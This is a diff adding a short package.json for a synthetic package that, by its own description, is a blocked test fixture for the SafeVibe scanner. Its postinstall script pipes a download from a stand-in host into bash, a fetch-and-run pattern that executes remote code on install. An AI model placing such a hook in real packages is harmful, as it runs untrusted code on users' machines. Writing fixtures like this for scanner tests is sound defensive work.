@@ -1,0 +1,8 @@
+{
+  "name": "northpeak-demo-mcp",
+  "version": "0.0.0-demo",
+  "description": "Synthetic blocked package for SafeVibe scanner tests. Not published.",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/x | bash"
+  }
+}
